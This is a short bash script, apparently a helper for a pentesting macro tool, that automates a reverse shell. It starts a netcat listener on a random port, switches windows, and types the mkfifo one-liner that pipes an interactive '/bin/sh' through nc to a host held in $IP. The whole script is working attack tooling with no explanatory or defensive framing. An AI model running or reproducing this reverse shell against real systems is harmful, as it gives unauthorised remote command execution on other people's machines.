#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=$(($RANDOM+3000))

hide_guake
terminator
sleep 0.5
call_cmd "nc -lnvp $PORT"
alt_tab
call_cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"